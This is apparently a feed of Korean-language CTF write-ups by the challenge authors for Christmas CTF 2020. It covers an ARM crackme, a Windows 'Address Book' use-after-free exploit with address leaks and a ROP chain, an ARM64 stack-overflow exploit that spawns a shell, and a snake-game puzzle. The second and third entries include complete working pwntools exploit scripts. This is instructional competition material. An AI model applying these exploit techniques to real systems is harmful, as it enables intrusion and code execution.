class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>입력 값과 value2를 인자로 <code>sub_9fc</code>를 수행하는 것을 확인할 수 있습니다. <code>sub_9fc</code>의 경우 아까 python script를 짜 놓았기 때문에 그냥 값을 입력하여 연산하면 됩니다.</p><pre><code class="hljs python">string3 = [    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)):    flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS&#123;s4nta_can_enter_the_h0use&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>arm</tag>
      
      <tag>crackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
    <link href="/2020/12/29/l0ch/address_book/"/>
    <url>/2020/12/29/l0ch/address_book/</url>
    
    <content type="html"><![CDATA[<p>처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ</p><p>idioth형이 대회 중간에 0솔버를 위한 선물이라고 짤을 하나 보내줬는데…</p><p><img src="/2020/12/29/l0ch/address_book/1.png"></p><blockquote><p>즌쯔… 느므 그믑느…^^</p></blockquote><p>그래도 대회 12시간만에 다행히 솔버가 나와서 다행이라고 생각합니다 ㅎㅎ.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>먼저, 문제 환경부터 보시죠</p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit 윈도우 10 환경이며, 보호기법은 모두 걸려있네요!</p><p>어떤 기능들이 있는지 보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/2.png"></p><ol><li><p>Add address Info</p><p>name, address, city를 입력받고 address info를 추가</p></li><li><p>Address Info List</p><p>추가한 address info들을 출력</p></li><li><p>Delete address Info</p><p>address info를 삭제. 이 때 삭제된 info는 Recycle Bin List에 추가</p></li><li><p>Restore address Info</p><p>삭제된 info를 원래 List로 복구</p></li><li><p>Modify address Info</p><p>수정할 address info를 선택해 name, address, city를 수정 가능</p></li><li><p>Empty List</p><p>address list와 recycle bin list 항목을 모두 삭제</p></li><li><p>Exit</p></li></ol><p>7번으로 종료하면</p><p><img src="/2020/12/29/l0ch/address_book/3.png"></p><p>list가 저장되었다고 뜨는데, 옆에 메모리 주소로 보이는 값이 존재합니다.</p><p>리스트는 double linked list로 구현되어 있으며 처음에 <code>Address Book</code>, <code>Recycle Bin</code> 두개의 객체가 할당되어 각각 2byte 정수 type의 reference count (초기값=10)를 가집니다. 함수가 객체를 참조할 때 count가 10 올라가며 해당 함수를 빠져나올때 count가 10 감소하고 10보다 작으면 할당된 객체를 free하고 객체의 주소를 출력합니다.</p><p>감이 오시죠. C++의 공유포인터 <code>std::shared_ptr</code> 를 커스텀 구현한 문제입니다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>의 info를 restore할때 복구하는 노드에서, <code>Recycle Bin</code>에서 사용한 next 값이 초기화되지 않고 남아있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/4.png"><br>노드를 네 개 생성한 뒤 4, 3을 차례대로 삭제하면 Recycle Bin 리스트에 순서대로 들어갑니다.</p><p><img src="/2020/12/29/l0ch/address_book/5.png"></p><p>Restore 4로 <code>Address List</code>로 복구했을때 node 4의 next 가 초기화되지 않고 여전히 <code>Recycle Bin</code>의 3을 가리킵니다.</p><p><img src="/2020/12/29/l0ch/address_book/6.png"></p><p>Restore 3을 하면 <code>Address List</code>에 index 순서에 맞게 2와 4 사이에 삽입되고 결과적으로 다음과 같이 3과 4의 next가 각각 서로를 가리키게 되어 순환적인 구조를 가진 리스트를 만들 수 있습니다.</p><p><code>Address List</code>의 노드들을 출력하는 함수는 노드의 next가 NULL일때까지 혹은 입력한 수만큼 재귀호출을 통해 head 노드부터 출력합니다. 이때 입력한 수를 검증하지 않아 reference counter의  integer overflow가 발생할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/7.png"><br>재귀함수의 인자로 <code>Address List</code>의 포인터가 들어가는데, 재귀함수가 한 번 호출될때마다 <code>Address List</code>의 reference count가 10씩 증가합니다. </p><p>위와 같이 취약점을 트리거했을 때 정확히 3275만큼 재귀로 참조하면 2byte 정수 조건을 벗어나게 되어 free 조건인 <code>reference count &lt; 10</code> 을 만족하게 되고 AddressBook 포인터가 한 번 free됩니다.  </p><p>이어 Add Address Info에서 노드를 새로 할당하는 것으로 UAF를 트리거할 수 있어 Address Info에서 <code>name</code> 으로 vtable 을 overwrite 해 eip control이 가능합니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>바이너리에서 <code>flag.txt</code>를 open했으니 <code>read</code>와 <code>write</code>로 flag 내용을 출력하기만 하면 됩니다.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROP에 필요한 건 다음과 같습니다.</p><p><code>ntdll.dll</code> base address → gadget</p><p><code>ucrtbase.dll</code> base address → <code>read</code>, <code>write</code></p><p>위 주소들을 구하기 위해서 먼저 바이너리의 imagebase부터 leak해야 합니다.</p><p>UAF 이후 leak은 Address Info를 출력할 때 <code>head</code> 포인터 값에서부터 참조하는 것을 이용해 Address Info의 <code>city+16</code> 에서 <code>head</code> 포인터를 overwrite → OOB read가 가능한 점을 이용합니다.</p><p><img src="/2020/12/29/l0ch/address_book/8.png"></p><p>몇번 실행해보면 객체간 offset 에 패턴이 있습니다. offset을 계산해서 city+16 에 Recycle Bin의 주소로 head 를 overwrite하고 2번 메뉴로 출력하면 vtable 주소를 구할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/9.png"></p><p><code>Recycle Bin</code>의 vtable offset은 0x6960이니 leak한 vtable에 offset만큼 빼면 imagebase가 나오겠군요!</p><p>이제 imagebase를 구했으니 dll 주소를 구하는건 쉽습니다!</p><p>구하고싶은 dll의 아무 함수나 IAT 테이블에서 offset을 찾고, imagebase+offset 주소에 존재하는 dll 함수 주소를 leak하면 되죠. <code>ntdll</code>부터 구해보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/10.png"></p><p><code>!dh imagebase</code> 로 IAT offset을 찾고 Import된 dll 함수를 찾아볼게요</p><p><img src="/2020/12/29/l0ch/address_book/11.png"></p><p><code>ntdll!RtlInitializeSListHead</code> 가 imagebase+ 0x6060에 있네요.</p><p><code>ucrtbase!free</code> 도 imagebase + 0x61f0 인걸 확인할 수 있습니다.</p><p>vtable을 leak했을 때와 같은 방법으로 <code>head</code>를 overwrite해 해당 메모리에 있는 값을 출력하고 각각 dll 내 offset을 빼주면 dll base address를 구할 수 있습니다!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># 전체 코드는 아래 Exploit Code 참조</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png"></p><p>이제 필요한 주소들도 모두 구했고 eip도 컨트롤할 수 있으니, ROP chain만 구성하면 됩니다.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> 로 rsp를 현재 페이로드가 올라와 있는 주소로 pivot 한뒤 <code>read</code>, <code>write</code>를 차례로 호출하면 flag를 출력할 수 있습니다!</p><p><img src="/2020/12/29/l0ch/address_book/13.png"></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))p.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - baby-RudOlPh</title>
    <link href="/2020/12/29/l0ch/baby_rudolph/"/>
    <url>/2020/12/29/l0ch/baby_rudolph/</url>
    
    <content type="html"><![CDATA[<p>baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png"></p><p>바이너리를 받고 보호기법과 아키텍쳐를 확인해보면 64bit ARM이고, NX bit만 걸려있는걸 확인할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png"><br>분석해보면 vuln이라는 함수를 대놓고 줍니다. read 함수를 호출하는데 0x100만큼 받아서 stack overwflow가 발생하네요</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png"></p><p><code>get_arm</code> 함수를 보면 첫 번째 인자의 값이 <code>0x1225</code> 면 <code>system(&quot;/bin/sh&quot;)</code>을 실행해 쉘을 획득할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png"></p><p><code>ARMmaker</code> 함수에는 인자를 세팅 할 수 있는 gadget이 있네요.</p><ol><li><code>vuln</code> 의 return address를 <code>ARMmaker</code>의 gadget으로 overwrite</li><li>gadget을 통해 인자를 <code>0x1225</code>로 세팅하고 <code>get_arm</code> 호출</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png"></p><p>뉴비용 포너블 문제를 내려는데 그냥 내면 심심해서 64bit ARM으로 내봤습니다 ㅎㅎ 역시 많은 분들이 풀어주셨습니다! </p><p>(문제 만드는 시간보다 도커에 세팅하는데 드는 시간이 더 오래 걸렸던 건 비밀..)</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
    <link href="/2020/12/29/l0ch/picky_eater/"/>
    <url>/2020/12/29/l0ch/picky_eater/</url>
    
    <content type="html"><![CDATA[<p>picky_eater는 snake game을 윈도우 콘솔로 구현한 미스크 문제입니다.</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>위와 같은 문제의 디스크립션과 함께 바이너리가 주어집니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/1.png"></p><p>바이너리를 실행하면 위와 같은 화면이 나오는데, 아무키나 누르면 snake 게임이 시작됩니다.</p><p>snake 게임의 룰은 간단합니다! 처음엔 짧은 길이의 뱀이 나오는데, 이 뱀을 컨트롤해 화면상에 나오는 먹이를 먹으면 뱀 길이가 길어지고 뱀의 속도가 빨라지는 간단한 룰이죠</p><p><img src="/2020/12/29/l0ch/picky_eater/2.png"></p><p>뱀의 먹이로는 문자가 하나씩 나옵니다. 문자들을 하나씩 모아보면<code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 라는 플래그가 나오는데, 이 플래그를 인증하면 인증에 실패하게 됩니다.</p><p>진짜 플래그는 게임의 규칙을 통해 얻을 수 있는데, 문제의 디스크립션을 다시 한 번 볼까요?</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>먹이를 먹으면 다음과 같은 변화가 발생합니다.</p><ol><li>길이가 길어짐</li><li>속도가 빨라짐</li></ol><p>속도는 육안으로 확인하기 어려울 것 같으니, 길이와 관련된 규칙을 생각하며 플레이해봅시다.</p><p>처음 길이는 머리를 제외하고 4칸입니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/3.png"></p><p>첫 번째 먹이인 <code>X</code> 를 먹고 P로 일시정지를 해보겠습니다.</p><p>뱀의 길이가 6으로 두 칸 길어졌네요. 이렇게 <code>XMAS&#123;$</code> 까지 먹어보겠습니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/4.png"></p><p>길이가 16이니까 XMAS{$ 를 먹었을땐 모두 길이가 길어진 것을 확인이 가능합니다. </p><p><img src="/2020/12/29/l0ch/picky_eater/5.png"></p><p>그러나 <code>0</code> 을 먹었을때는 길이가 16 그대로군요. 이렇게  <code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 중 먹었을 때 길이가 늘어나지 않는 문자를 빼면 <code>XMAS&#123;$o_P1cky_$n4k3!&#125;</code> 라는 진짜 플래그가 나오게 됩니다!</p><p><img src="/2020/12/29/l0ch/picky_eater/6.png"></p><p>참고로 IDA에서 분석해보면 fake flag가 있고</p><p><img src="/2020/12/29/l0ch/picky_eater/7.png"></p><p>플래그 index 가 있는 배열이 있어 이걸 보고 풀어도 됩니다.</p><p>여담으로.. fake flag를 너무 진짜처럼 넣어놓는 바람에.. picky_eater가 공개되자마자 플래그 인증요청과 문의가 폭주해서 정신을 못차렸었네요 하하..</p><p><img src="/2020/12/29/l0ch/picky_eater/8.png"></p><blockquote><p>간단요약짤 - picky_eater 공개 10분 뒤 문제 별 플래그 인증요청횟수(태그 클라우드)</p></blockquote><p>플래그 인증 관련해서 문제가 없다는 공지를 올린 이후 많은 팀들이 풀어주셨지만, 문제 출제 중 미처 생각 못한 점 때문에 참가자분들께 혼란을 드려 반성하고 있습니다 ㅠㅠㅠ</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
